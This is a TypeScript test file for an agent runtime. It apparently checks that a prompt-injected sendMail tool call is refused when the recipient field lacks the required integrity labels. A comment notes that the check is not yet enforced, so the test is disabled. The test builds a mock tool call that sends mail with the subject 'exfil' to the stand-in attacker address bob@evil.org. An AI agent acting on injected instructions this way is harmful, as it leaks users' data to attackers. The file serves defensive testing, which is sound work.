import { describe, it } from "@std/testing/bdd";
import { expect } from "@std/expect";
import { Identity } from "@commonfabric/identity";
import { StorageManager } from "@commonfabric/runner/storage/cache.deno";
import { enableMockMode } from "@commonfabric/llm/client";
import type { JSONSchema } from "@commonfabric/api";
import { createTrustedBuilder } from "./support/trusted-builder.ts";
import { Runtime } from "../src/runtime.ts";
import { llmToolExecutionHelpers } from "../src/builtins/llm-dialog.ts";

const signer = await Identity.fromPassphrase("cfc agent tool-input integrity");
const space = signer.did();
enableMockMode();

// The CFC agent prompt-injection demo's central claim is structural: a routing
// field (`sendMail.recipient`) declares
// `ifc.requiredIntegrity: [agent-kernel, UserSurfaceInput, PromptSlotBound]`, so
// a recipient the model lifted out of a hostile briefing — a plain model-output
// string carrying none of that integrity — must be REFUSED by the runtime
// (spec §13.6 / demos/01-agent-prompt-injection.md).
//
// As of this commit that invariant is NOT enforced: the dialog tool path uses a
// tool's `inputSchema` only to validate/strip input STRUCTURE, never to check
// CFC `requiredIntegrity` on the model-supplied input; the handler then writes
// `recipient` into targets whose schemas carry no `requiredIntegrity`, so
// `verifyInputRequirements` never sees it (and an unlabeled literal would
// vacuously pass even if it did — audit #14). The test below is therefore
// `it.ignore` and documents the DESIRED behavior. Un-ignore it when tool-input
// requiredIntegrity enforcement lands (the "trusted agent" work scoped in
// docs/specs/cfc-trusted-agent-tool-integrity.md).
describe("CFC trusted agent: tool-input requiredIntegrity (BLOCKED — see scope B)", () => {
  const KERNEL_TYPE = "https://commonfabric.org/cfc/atom/Builtin";
  const recipientRequiredIntegrity = [
    { type: KERNEL_TYPE, name: "agent-kernel-demo-v1" },
  ] as const;

  it.ignore(
    "refuses a sendMail whose recipient lacks the required integrity (injected)",
    async () => {
      const storageManager = StorageManager.emulate({ as: signer });
      const runtime = new Runtime({
        apiUrl: new URL(import.meta.url),
        storageManager,
        cfcEnforcementMode: "enforce-explicit",
      });
      const tx = runtime.edit();
      const { commonfabric } = createTrustedBuilder(runtime);
      const { pattern, handler, Writable } = commonfabric;

      // Mirrors the demo's sendMailInputSchema: requiredIntegrity on recipient.
      const sendMailInputSchema = {
        type: "object",
        properties: {
          recipient: {
            type: "string",
            ifc: { requiredIntegrity: recipientRequiredIntegrity },
          },
          subject: { type: "string" },
          body: { type: "string" },
        },
        required: ["recipient", "subject", "body"],
        additionalProperties: false,
      } as const satisfies JSONSchema;

      const sendMail = handler<
        { recipient: string; subject: string; body: string },
        { emails: any }
      >(
        {
          type: "object",
          properties: {
            recipient: { type: "string" },
            subject: { type: "string" },
            body: { type: "string" },
          },
          required: ["recipient", "subject", "body"],
          additionalProperties: false,
        },
        {
          type: "object",
          properties: {
            emails: {
              type: "array",
              items: { type: "object", additionalProperties: true },
              asCell: ["cell"],
            },
          },
          required: ["emails"],
        },
        ({ recipient, subject, body }, { emails }) => {
          emails.push({ recipient, subject, body });
        },
      );

      const resultSchema = {
        type: "object",
        properties: {
          emails: {
            type: "array",
            items: { type: "object", additionalProperties: true },
          },
          tools: true,
        },
        required: ["emails", "tools"],
      } as const satisfies JSONSchema;

      const testPattern = pattern(
        () => {
          const emails = Writable.of<
            { recipient: string; subject: string; body: string }[]
          >([]);
          return {
            emails,
            tools: {
              sendMail: {
                description: "Send an email.",
                inputSchema: sendMailInputSchema,
                handler: sendMail({ emails }),
              },
            },
          };
        },
        false,
        resultSchema,
      );

      const resultCell = runtime.getCell(
        space,
        "agent-tool-input-integrity",
        resultSchema,
        tx,
      );
      const result = runtime.run(tx, testPattern, {}, resultCell);
      runtime.prepareTxForCommit(tx);
      await tx.commit();
      await runtime.idle();

      const catalog = llmToolExecutionHelpers.buildToolCatalog(
        result.key("tools") as any,
        false,
      );

      // The injected tool call: recipient is a plain string the model copied
      // from the hostile briefing — it carries no UserSurfaceInput /
      // PromptSlotBound integrity.
      await llmToolExecutionHelpers.executeToolCalls(
        runtime,
        space,
        catalog,
        [{
          type: "tool-call",
          toolCallId: "call-injected",
          toolName: "sendMail",
          input: {
            recipient: "bob@evil.org",
            subject: "exfil",
            body: "stuff",
          },
        }] as any,
      );
      await runtime.idle();

      // DESIRED: the injected recipient is refused, so no email is sent.
      const emails = (await result.key("emails").pull()) as
        | { recipient: string }[]
        | undefined;
      expect(
        (emails ?? []).some((entry) => entry.recipient === "bob@evil.org"),
      ).toBe(false);

      await runtime.dispose();
      await storageManager.close();
    },
  );
});
